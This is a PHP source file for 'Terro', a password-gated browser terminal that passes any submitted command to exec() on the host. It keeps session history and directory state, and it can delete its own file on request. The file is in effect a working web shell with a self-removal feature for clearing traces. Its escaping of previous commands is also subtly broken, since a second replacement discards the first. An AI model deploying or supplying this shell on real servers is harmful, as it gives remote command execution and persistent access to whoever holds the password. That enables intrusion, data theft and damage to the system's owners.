<?php

class Terro {

    private $servicePassword;
    private $loginMessage = "";
    private $orginalDirectory = "";

    public function __construct($servicePassword) {
        session_start();

        $this->servicePassword = $servicePassword;

        if ( ! isset($_SESSION['persist_commands']) OR ! isset($_SESSION['commands'])) {
            $_SESSION['persist_commands'] = array();
            $_SESSION['commands'] = array();
            $_SESSION['command_responses'] = array();
            $_SESSION['directory'] = getcwd();
        }

        $this->orginalDirectory = getcwd();

        if (isset($_POST['command'])) {
            if (!isset($_SESSION['logged_in'])) {
                if ($_POST['command'] == $this->servicePassword) {
                    $this->login();
                } else {
                    $this->loginMessage = "Invalid password";
                }
            } else {
                if($this->isLoggedIn() && $_POST['command'] != $this->servicePassword) {
                    $this->commandRouting($_POST['command']);
                }
            }
        }

        if($this->isLoggedIn()) {
            if (isset($_GET['logout'])) {
                $this->logout();
            }

            if (isset($_GET['remove'])) {
                $this->remove();
            }
        }
    }

    public function getVersion() {
        return VERSION;
    }

    public function isLoggedIn() {
        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] == true;
    }

    public function getLoginMessage() {
        return $this->loginMessage;
    }

    public function getCurrentDirectory() {
        return $_SESSION['directory'];
    }

    public function getCommandsCount() {
        return count($_SESSION['commands']);
    }

    private function commandRouting($command) {
        chdir($_SESSION['directory']);

        if ($command != '') {
            if ($command == 'logout') {
                $this->logout();
            } elseif ($command == 'clear') {
                $this->clear();
            } else {
                $this->execute($command);
            }
        }

        chdir($this->orginalDirectory);
    }

    private function execute($command) {
        $response = array();

        exec($command . ' 2>&1', $response, $error_code);
        if ($error_code > 0 AND $response == array()) {
            $response = array('Error');
        } else {
            if(strpos($command, 'cd') !== false) {
                if(strpos($command, '~') !== false) {
                    chdir(__DIR__);
                    $_SESSION['directory'] = __DIR__;
                    $response = array('TERRO: Changed dir to original base path');
                } else {
                    chdir(str_replace("cd ", "", $command));
                    $_SESSION['directory'] = getcwd();
                }
            }
        }

        array_push($_SESSION['commands'], $command);
        array_push($_SESSION['command_responses'], $response);
    }

    private function clear() {
        $_SESSION['commands'] = array();
        $_SESSION['command_responses'] = array();
    }

    private function login() {
        $_SESSION['logged_in'] = TRUE;
    }

    private function logout() {
        $this->loginMessage = "Bye bye!";
        session_unset();
    }

    private function remove() {
        if(VERSION == 'dev') {
            die("This is dev version. :D :D");
        } else {
            unlink(__FILE__);

            if(!file_exists(__FILE__)) {
                die("Terro was removed. Please refresh page :)");
            } else {
                die("Upss.. Terro was not removed.. ");
            }
        }
    }

    public function getPreviousCommands() {
        $single_quote_cancelled_commands = array();
        if ( ! empty( $_SESSION['commands'] ) ) {
            foreach ($_SESSION['commands'] as $command) {
                $cancelled_command = str_replace("\\", "\\\\", $command);
                $cancelled_command = str_replace("\"", "\\\"", $command);
                $single_quote_cancelled_commands[] = $cancelled_command;
            }
        }

        return implode("\", \"", $single_quote_cancelled_commands);
    }
}